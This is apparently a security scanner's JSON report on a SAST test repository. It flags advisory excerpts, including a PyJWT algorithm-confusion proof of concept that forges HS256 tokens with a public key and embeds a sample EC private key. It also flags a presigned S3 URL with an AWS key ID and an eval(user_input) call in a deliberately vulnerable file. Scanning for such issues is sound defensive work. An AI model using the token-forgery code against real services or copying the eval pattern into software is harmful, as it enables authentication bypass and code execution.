{
  "keywords": {
    "found": [
      "verify",
      "artefacts"
    ],
    "missing": []
  },
  "findings": [
    {
      "pattern": "generic_private_key",
      "severity": "high",
      "description": "File appears to contain a private key block",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sandbox_report_Sun-09-Nov-2025-2101UTC-001.json",
      "line": 88,
      "excerpt": "\"excerpt\": \"\\\"details\\\": \\\"### Impact\\\\n_What kind of vulnerability is it? Who is impacted?_\\\\n\\\\nDisclosed by Aapo Oksman (Senior Security Specialist, Nixu Corporation).\\\\n\\\\n> PyJWT supports multiple different JWT signing algorithms. With JWT, an \\\\n> attacker submitting the JWT token can choose the used signing algorithm.\\\\n> \\\\n> The PyJWT library requires that the application chooses what algorithms \\\\n> are supported. The application can specify \\\\n> \\\\\\\"jwt.algorithms.get_default_algorithms()\\\\\\\" to get support for all \\\\n> algorithms. They can also specify a single one of them (which is the \\\\n> usual use case if calling jwt.decode directly. However, if calling \\\\n> jwt.decode in a helper function, all algorithms might be enabled.)\\\\n> \\\\n> For example, if the user chooses \\\\\\\"none\\\\\\\" algorithm and the JWT checker \\\\n> supports that, there will be no signature checking. This is a common \\\\n> security issue with some JWT implementations.\\\\n> \\\\n> PyJWT combats this by requiring that the if the \\\\\\\"none\\\\\\\" algorithm is \\\\n> used, the key has to be empty. As the key is given by the application \\\\n> running the checker, attacker cannot force \\\\\\\"none\\\\\\\" cipher to be used.\\\\n> \\\\n> Similarly with HMAC (symmetric) algorithm, PyJWT checks that the key is \\\\n> not a public key meant for asymmetric algorithm i.e. HMAC cannot be used \\\\n> if the key begins with \\\\\\\"ssh-rsa\\\\\\\". If HMAC is used with a public key, the \\\\n> attacker can just use the publicly known public key to sign the token \\\\n> and the checker would use the same key to verify.\\\\n> \\\\n>  From PyJWT 2.0.0 onwards, PyJWT supports ed25519 asymmetric algorithm. \\\\n> With ed25519, PyJWT supports public keys that start with \\\\\\\"ssh-\\\\\\\", for \\\\n> example \\\\\\\"ssh-ed25519\\\\\\\".\\\\n\\\\n```python\\\\nimport jwt\\\\nfrom cryptography.hazmat.primitives import serialization\\\\nfrom cryptography.hazmat.primitives.asymmetric import ed25519\\\\n\\\\n# Generate ed25519 private key\\\\nprivate_key = ed25519.Ed25519PrivateKey.generate()\\\\n\\\\n# Get private key bytes as they would be stored in a file\\\\npriv_key_bytes = \\\\nprivate_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8, \\\\nencryption_algorithm=serialization.NoEncryption())\\\\n\\\\n# Get public key bytes as they would be stored in a file\\\\npub_key_bytes = \\\\nprivate_key.public_key().public_bytes(encoding=serialization.Encoding.OpenSSH,format=serialization.PublicFormat.OpenSSH)\\\\n\\\\n# Making a good jwt token that should work by signing it with the \\\\nprivate key\\\\nencoded_good = jwt.encode({\\\\\\\"test\\\\\\\": 1234}, priv_key_bytes, algorithm=\\\\\\\"EdDSA\\\\\\\")\\\\n\\\\n# Using HMAC with the public key to trick the receiver to think that the \\\\npublic key is a HMAC secret\\\\nencoded_bad = jwt.encode({\\\\\\\"test\\\\\\\": 1234}, pub_key_bytes, algorithm=\\\\\\\"HS256\\\\\\\")\\\\n\\\\n# Both of the jwt tokens are validated as valid\\\\ndecoded_good = jwt.decode(encoded_good, pub_key_bytes, \\\\nalgorithms=jwt.algorithms.get_default_algorithms())\\\\ndecoded_bad = jwt.decode(encoded_bad, pub_key_bytes, \\\\nalgorithms=jwt.algorithms.get_default_algorithms())\\\\n\\\\nif decoded_good == decoded_bad:\\\\n \\u00a0\\u00a0\\u00a0 print(\\\\\\\"POC Successfull\\\\\\\")\\\\n\\\\n# Of course the receiver should specify ed25519 algorithm to be used if \\\\nthey specify ed25519 public key. However, if other algorithms are used, \\\\nthe POC does not work\\\\n# HMAC specifies illegal strings for the HMAC secret in jwt/algorithms.py\\\\n#\\\\n#\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0 invalid_strings = [\\\\n#\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0 b\\\\\\\"-----BEGIN PUBLIC KEY-----\\\\\\\",\\\\n#\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0 b\\\\\\\"-----BEGIN CERTIFICATE-----\\\\\\\",\\\\n#\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0 b\\\\\\\"-----BEGIN RSA PUBLIC KEY-----\\\\\\\",\\\\n#\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0 b\\\\\\\"ssh-rsa\\\\\\\",\\\\n#\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0 ]\\\\n#\\\\n# However, OKPAlgorithm (ed25519) accepts the following in \\\\njwt/algorithms.py:\\\\n#\\\\n#\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0 if \\\\\\\"-----BEGIN PUBLIC\\\\\\\" in str_key:\\\\n#\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0 return load_pem_public_key(key)\\\\n#\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0 if \\\\\\\"-----BEGIN PRIVATE\\\\\\\" in str_key:\\\\n#\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0 return load_pem_private_key(key, password=None)\\\\n#\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0 if str_key[0:4] == \\\\\\\"ssh-\\\\\\\":\\\\n#\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0\\u00a0 return load_ssh_public_key(key)\\\\n#\\\\n# These should most likely made to match each other to prevent this behavior\\\\n```\\\\n\\\\n\\\\n```python\\\\nimport jwt\\\\n\\\\n#openssl ecparam -genkey -name prime256v1 -noout -out ec256-key-priv.pem\\\\n#openssl ec -in ec256-key-priv.pem -pubout > ec256-key-pub.pem\\\\n#ssh-keygen -y -f ec256-key-priv.pem > ec256-key-ssh.pub\\\\n\\\\npriv_key_bytes = b\\\\\\\"\\\\\\\"\\\\\\\"-----BEGIN EC PRIVATE KEY-----\\\\nMHcCAQEEIOWc7RbaNswMtNtc+n6WZDlUblMr2FBPo79fcGXsJlGQoAoGCCqGSM49\\\\nAwEHoUQDQgAElcy2RSSSgn2RA/xCGko79N+7FwoLZr3Z0ij/ENjow2XpUDwwKEKk\\\\nAk3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==\\\\n-----END EC PRIVATE KEY-----\\\\\\\"\\\\\\\"\\\\\\\"\\\\n\\\\npub_key_bytes = b\\\\\\\"\\\\\\\"\\\\\\\"-----BEGIN PUBLIC KEY-----\\\\nMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAElcy2RSSSgn2RA/xCGko79N+7FwoL\\\\nZr3Z0ij/ENjow2XpUDwwKEKkAk3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==\\\\n-----END PUBLIC KEY-----\\\\\\\"\\\\\\\"\\\\\\\"\\\\n\\\\nssh_key_bytes = b\\\\\\\"\\\\\\\"\\\\\\\"ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXMtkUkkoJ9kQP8QhpKO/TfuxcKC2a92dIo/xDY6MNl6VA8MChCpAJN0w1wvVPJ4qTJRnGO7A6V6dl8oRxDPkc=\\\\\\\"\\\\\\\"\\\\\\\"\\\\n\\\\n# Making a good jwt token that should work by signing it with the private key\\\\nencoded_good = jwt.encode({\\\\\\\"test\\\\\\\": 1234}, priv_key_bytes, algorithm=\\\\\\\"ES256\\\\\\\")\\\\n\\\\n# Using HMAC with the ssh public key to trick the receiver to think that the public key is a HMAC secret\\\\nencoded_bad = jwt.encode({\\\\\\\"test\\\\\\\": 1234}, ssh_key_bytes, algorithm=\\\\\\\"HS256\\\\\\\")\\\\n\\\\n# Both of the jwt tokens are validated as valid\\\\ndecoded_good = jwt.decode(encoded_good, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())\\\\ndecoded_bad = jwt.decode(encoded_bad, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())\\\\n\\\\nif decoded_good == decoded_bad:\\\\n    print(\\\\\\\"POC Successfull\\\\\\\")\\\\nelse:\\\\n    print(\\\\\\\"POC Failed\\\\\\\")\\\\n```\\\\n\\\\n> The issue is not that big as \\\\n> algorithms=jwt.algorithms.get_default_algorithms() has to be used. \\\\n> However, with quick googling, this seems to be used in some cases at \\\\n> least in some minor projects.\\\\n\\\\n### Patches\\\\n\\\\nUsers should upgrade to v2.4.0.\\\\n\\\\n### Workarounds\\\\n\\\\nAlways be explicit with the algorithms that are accepted and expected when decoding.\\\\n\\\\n### References\\\\n_Are there any links users can visit to find out more?_\\\\n\\\\n### For more information\\\\nIf you have any questions or comments about this advisory:\\\\n* Open an issue in https://github.com/jpadilla/pyjwt\\\\n* Email Jos\\u00e9 Padilla: pyjwt at jpadilla dot com\\\\n\\\",\""
    },
    {
      "pattern": "aws_access_key",
      "severity": "high",
      "description": "Hard-coded AWS access key detected",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sandbox_report_Sun-09-Nov-2025-2101UTC-001.json",
      "line": 96,
      "excerpt": "\"excerpt\": \"\\\"details\\\": \\\"### Impact\\\\nAn attacker who uses this vulnerability can craft a PDF which leads to an infinite loop if `__parse_content_stream` is executed. This infinite loop blocks the current process and can utilize a single core of the CPU by 100%. It does not affect memory usage. That is, for example, the case if the user extracted text from such a PDF.\\\\n\\\\nExample Code and a PDF that causes the issue:\\\\n\\\\n```python\\\\nfrom pypdf import PdfReader\\\\n\\\\n# https://objects.githubusercontent.com/github-production-repository-file-5c1aeb/3119517/11367871?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230627%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230627T201018Z&X-Amz-Expires=300&X-Amz-Signature=d71c8fd9181c4875f0c04d563b6d32f1d4da6e7b2e6be2f14479ce4ecdc9c8b2&X-Amz-SignedHeaders=host&actor_id=1658117&key_id=0&repo_id=3119517&response-content-disposition=attachment%3Bfilename%3DMiFO_LFO_FEIS_NOA_Published.3.pdf&response-content-type=application%2Fpdf\\\\nreader = PdfReader(\\\\\\\"MiFO_LFO_FEIS_NOA_Published.3.pdf\\\\\\\")\\\\npage = reader.pages[0]\\\\npage.extract_text()\\\\n```\\\\n\\\\nThe issue was introduced with https://github.com/py-pdf/pypdf/pull/969\\\\n\\\\n### Patches\\\\n\\\\nThe issue was fixed with https://github.com/py-pdf/pypdf/pull/1828\\\\n\\\\n### Workarounds\\\\n\\\\nIt is recommended to upgrade to `pypdf>=3.9.0`. PyPDF2 users should migrate to pypdf.\\\\n\\\\nIf you cannot update your version of pypdf, you should modify `pypdf/generic/_data_structures.py`:\\\\n\\\\n```\\\\nOLD: while peek not in (b\\\\\\\"\\\\\\\\r\\\\\\\", b\\\\\\\"\\\\\\\\n\\\\\\\"):\\\\nNEW: while peek not in (b\\\\\\\"\\\\\\\\r\\\\\\\", b\\\\\\\"\\\\\\\\n\\\\\\\", b\\\\\\\"\\\\\\\"):\\\\n```\\\",\""
    },
    {
      "pattern": "python_requests",
      "severity": "medium",
      "description": "Python performs outbound network requests via requests library",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/complete_run_audit.py",
      "line": 90,
      "excerpt": "response = requests.post(url, headers=headers, json=payload)"
    },
    {
      "pattern": "python_requests",
      "severity": "medium",
      "description": "Python performs outbound network requests via requests library",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/main.py",
      "line": 39,
      "excerpt": "response = requests.post(url, headers=headers, json=payload)"
    },
    {
      "pattern": "python_requests",
      "severity": "medium",
      "description": "Python performs outbound network requests via requests library",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/upload_blob_storage.py",
      "line": 25,
      "excerpt": "resp = requests.post("
    },
    {
      "pattern": "python_requests",
      "severity": "medium",
      "description": "Python performs outbound network requests via requests library",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/upload_blob_storage.py",
      "line": 48,
      "excerpt": "put_resp = requests.put("
    },
    {
      "pattern": "python_requests",
      "severity": "medium",
      "description": "Python performs outbound network requests via requests library",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/upload_blob_storage.py",
      "line": 59,
      "excerpt": "resp_read = requests.post("
    },
    {
      "pattern": "python_requests",
      "severity": "medium",
      "description": "Python performs outbound network requests via requests library",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/start_run_audit.py",
      "line": 48,
      "excerpt": "response = requests.post(f\"{SAST_SCAN_RESULT_API_URL}/start_run\", json=payload, headers=headers)"
    },
    {
      "pattern": "python_requests",
      "severity": "medium",
      "description": "Python performs outbound network requests via requests library",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/update_run_audit.py",
      "line": 45,
      "excerpt": "response = requests.post(url, json=payload, headers=headers)"
    },
    {
      "pattern": "python_requests",
      "severity": "medium",
      "description": "Python performs outbound network requests via requests library",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/initialise_run.py",
      "line": 28,
      "excerpt": "resp = requests.post("
    },
    {
      "pattern": "python_eval_exec",
      "severity": "high",
      "description": "Python uses eval/exec, which can execute untrusted code",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/python/project/badpython.py",
      "line": 9,
      "excerpt": "eval(user_input)"
    },
    {
      "pattern": "python_eval_exec",
      "severity": "high",
      "description": "Python uses eval/exec, which can execute untrusted code",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/python/project/badpython.py",
      "line": 12,
      "excerpt": "# Replace eval(user_input) with a secure alternative"
    },
    {
      "pattern": "generic_private_key",
      "severity": "high",
      "description": "File appears to contain a private key block",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/python/project/run/PyPI/vulnerabilities.jsonl",
      "line": 366483,
      "excerpt": "\"details\": \"### Impact\\n_What kind of vulnerability is it? Who is impacted?_\\n\\nDisclosed by Aapo Oksman (Senior Security Specialist, Nixu Corporation).\\n\\n> PyJWT supports multiple different JWT signing algorithms. With JWT, an \\n> attacker submitting the JWT token can choose the used signing algorithm.\\n> \\n> The PyJWT library requires that the application chooses what algorithms \\n> are supported. The application can specify \\n> \\\"jwt.algorithms.get_default_algorithms()\\\" to get support for all \\n> algorithms. They can also specify a single one of them (which is the \\n> usual use case if calling jwt.decode directly. However, if calling \\n> jwt.decode in a helper function, all algorithms might be enabled.)\\n> \\n> For example, if the user chooses \\\"none\\\" algorithm and the JWT checker \\n> supports that, there will be no signature checking. This is a common \\n> security issue with some JWT implementations.\\n> \\n> PyJWT combats this by requiring that the if the \\\"none\\\" algorithm is \\n> used, the key has to be empty. As the key is given by the application \\n> running the checker, attacker cannot force \\\"none\\\" cipher to be used.\\n> \\n> Similarly with HMAC (symmetric) algorithm, PyJWT checks that the key is \\n> not a public key meant for asymmetric algorithm i.e. HMAC cannot be used \\n> if the key begins with \\\"ssh-rsa\\\". If HMAC is used with a public key, the \\n> attacker can just use the publicly known public key to sign the token \\n> and the checker would use the same key to verify.\\n> \\n>  From PyJWT 2.0.0 onwards, PyJWT supports ed25519 asymmetric algorithm. \\n> With ed25519, PyJWT supports public keys that start with \\\"ssh-\\\", for \\n> example \\\"ssh-ed25519\\\".\\n\\n```python\\nimport jwt\\nfrom cryptography.hazmat.primitives import serialization\\nfrom cryptography.hazmat.primitives.asymmetric import ed25519\\n\\n# Generate ed25519 private key\\nprivate_key = ed25519.Ed25519PrivateKey.generate()\\n\\n# Get private key bytes as they would be stored in a file\\npriv_key_bytes = \\nprivate_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8, \\nencryption_algorithm=serialization.NoEncryption())\\n\\n# Get public key bytes as they would be stored in a file\\npub_key_bytes = \\nprivate_key.public_key().public_bytes(encoding=serialization.Encoding.OpenSSH,format=serialization.PublicFormat.OpenSSH)\\n\\n# Making a good jwt token that should work by signing it with the \\nprivate key\\nencoded_good = jwt.encode({\\\"test\\\": 1234}, priv_key_bytes, algorithm=\\\"EdDSA\\\")\\n\\n# Using HMAC with the public key to trick the receiver to think that the \\npublic key is a HMAC secret\\nencoded_bad = jwt.encode({\\\"test\\\": 1234}, pub_key_bytes, algorithm=\\\"HS256\\\")\\n\\n# Both of the jwt tokens are validated as valid\\ndecoded_good = jwt.decode(encoded_good, pub_key_bytes, \\nalgorithms=jwt.algorithms.get_default_algorithms())\\ndecoded_bad = jwt.decode(encoded_bad, pub_key_bytes, \\nalgorithms=jwt.algorithms.get_default_algorithms())\\n\\nif decoded_good == decoded_bad:\\n \u00a0\u00a0\u00a0 print(\\\"POC Successfull\\\")\\n\\n# Of course the receiver should specify ed25519 algorithm to be used if \\nthey specify ed25519 public key. However, if other algorithms are used, \\nthe POC does not work\\n# HMAC specifies illegal strings for the HMAC secret in jwt/algorithms.py\\n#\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 invalid_strings = [\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 b\\\"-----BEGIN PUBLIC KEY-----\\\",\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 b\\\"-----BEGIN CERTIFICATE-----\\\",\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 b\\\"-----BEGIN RSA PUBLIC KEY-----\\\",\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 b\\\"ssh-rsa\\\",\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 ]\\n#\\n# However, OKPAlgorithm (ed25519) accepts the following in \\njwt/algorithms.py:\\n#\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 if \\\"-----BEGIN PUBLIC\\\" in str_key:\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 return load_pem_public_key(key)\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 if \\\"-----BEGIN PRIVATE\\\" in str_key:\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 return load_pem_private_key(key, password=None)\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 if str_key[0:4] == \\\"ssh-\\\":\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 return load_ssh_public_key(key)\\n#\\n# These should most likely made to match each other to prevent this behavior\\n```\\n\\n\\n```python\\nimport jwt\\n\\n#openssl ecparam -genkey -name prime256v1 -noout -out ec256-key-priv.pem\\n#openssl ec -in ec256-key-priv.pem -pubout > ec256-key-pub.pem\\n#ssh-keygen -y -f ec256-key-priv.pem > ec256-key-ssh.pub\\n\\npriv_key_bytes = b\\\"\\\"\\\"-----BEGIN EC PRIVATE KEY-----\\nMHcCAQEEIOWc7RbaNswMtNtc+n6WZDlUblMr2FBPo79fcGXsJlGQoAoGCCqGSM49\\nAwEHoUQDQgAElcy2RSSSgn2RA/xCGko79N+7FwoLZr3Z0ij/ENjow2XpUDwwKEKk\\nAk3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==\\n-----END EC PRIVATE KEY-----\\\"\\\"\\\"\\n\\npub_key_bytes = b\\\"\\\"\\\"-----BEGIN PUBLIC KEY-----\\nMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAElcy2RSSSgn2RA/xCGko79N+7FwoL\\nZr3Z0ij/ENjow2XpUDwwKEKkAk3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==\\n-----END PUBLIC KEY-----\\\"\\\"\\\"\\n\\nssh_key_bytes = b\\\"\\\"\\\"ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXMtkUkkoJ9kQP8QhpKO/TfuxcKC2a92dIo/xDY6MNl6VA8MChCpAJN0w1wvVPJ4qTJRnGO7A6V6dl8oRxDPkc=\\\"\\\"\\\"\\n\\n# Making a good jwt token that should work by signing it with the private key\\nencoded_good = jwt.encode({\\\"test\\\": 1234}, priv_key_bytes, algorithm=\\\"ES256\\\")\\n\\n# Using HMAC with the ssh public key to trick the receiver to think that the public key is a HMAC secret\\nencoded_bad = jwt.encode({\\\"test\\\": 1234}, ssh_key_bytes, algorithm=\\\"HS256\\\")\\n\\n# Both of the jwt tokens are validated as valid\\ndecoded_good = jwt.decode(encoded_good, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())\\ndecoded_bad = jwt.decode(encoded_bad, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())\\n\\nif decoded_good == decoded_bad:\\n    print(\\\"POC Successfull\\\")\\nelse:\\n    print(\\\"POC Failed\\\")\\n```\\n\\n> The issue is not that big as \\n> algorithms=jwt.algorithms.get_default_algorithms() has to be used. \\n> However, with quick googling, this seems to be used in some cases at \\n> least in some minor projects.\\n\\n### Patches\\n\\nUsers should upgrade to v2.4.0.\\n\\n### Workarounds\\n\\nAlways be explicit with the algorithms that are accepted and expected when decoding.\\n\\n### References\\n_Are there any links users can visit to find out more?_\\n\\n### For more information\\nIf you have any questions or comments about this advisory:\\n* Open an issue in https://github.com/jpadilla/pyjwt\\n* Email Jos\u00e9 Padilla: pyjwt at jpadilla dot com\\n\","
    },
    {
      "pattern": "aws_access_key",
      "severity": "high",
      "description": "Hard-coded AWS access key detected",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/python/project/run/PyPI/vulnerabilities.jsonl",
      "line": 108777,
      "excerpt": "\"details\": \"### Impact\\nAn attacker who uses this vulnerability can craft a PDF which leads to an infinite loop if `__parse_content_stream` is executed. This infinite loop blocks the current process and can utilize a single core of the CPU by 100%. It does not affect memory usage. That is, for example, the case if the user extracted text from such a PDF.\\n\\nExample Code and a PDF that causes the issue:\\n\\n```python\\nfrom pypdf import PdfReader\\n\\n# https://objects.githubusercontent.com/github-production-repository-file-5c1aeb/3119517/11367871?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230627%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230627T201018Z&X-Amz-Expires=300&X-Amz-Signature=d71c8fd9181c4875f0c04d563b6d32f1d4da6e7b2e6be2f14479ce4ecdc9c8b2&X-Amz-SignedHeaders=host&actor_id=1658117&key_id=0&repo_id=3119517&response-content-disposition=attachment%3Bfilename%3DMiFO_LFO_FEIS_NOA_Published.3.pdf&response-content-type=application%2Fpdf\\nreader = PdfReader(\\\"MiFO_LFO_FEIS_NOA_Published.3.pdf\\\")\\npage = reader.pages[0]\\npage.extract_text()\\n```\\n\\nThe issue was introduced with https://github.com/py-pdf/pypdf/pull/969\\n\\n### Patches\\n\\nThe issue was fixed with https://github.com/py-pdf/pypdf/pull/1828\\n\\n### Workarounds\\n\\nIt is recommended to upgrade to `pypdf>=3.9.0`. PyPDF2 users should migrate to pypdf.\\n\\nIf you cannot update your version of pypdf, you should modify `pypdf/generic/_data_structures.py`:\\n\\n```\\nOLD: while peek not in (b\\\"\\\\r\\\", b\\\"\\\\n\\\"):\\nNEW: while peek not in (b\\\"\\\\r\\\", b\\\"\\\\n\\\", b\\\"\\\"):\\n```\","
    }
  ],
  "tools": [
    {
      "command": "semgrep --config p/ci /tmp/mcp_semgrep_l9q0li0z/repo",
      "returncode": "0",
      "output": "\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Scan Status \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n  Scanning 78 files tracked by git with 145 Code rules:\n                                                                                                                        \n  Language      Rules   Files          Origin      Rules                                                                \n \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500        \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                                               \n  <multilang>       2      73          Community     145                                                                \n  python           19      17                                                                                           \n  terraform         5       6                                                                                           \n  yaml              7       3                                                                                           \n  dockerfile        2       2                                                                                           \n                                                                                                                        \n                \n                \n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Scan Summary \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\nSome files were skipped or only partially analyzed.\n  Scan was limited to files tracked by git.\n  Partially scanned: 1 files only partially analyzed due to parsing or internal Semgrep errors\n  Scan skipped: 5 files larger than 1.0 MB\n  For a full list of skipped files, run semgrep with the --verbose flag.\n\n(need more rules? `semgrep login` for additional free Semgrep Registry rules)\n\nRan 34 rules on 73 files: 0 findings.\n\nA new version of Semgrep is available. See https://semgrep.dev/docs/upgrading\nIf Semgrep missed a finding, please send us feedback to let us know!\nSee https://semgrep.dev/docs/reporting-false-negatives/"
    }
  ]
}
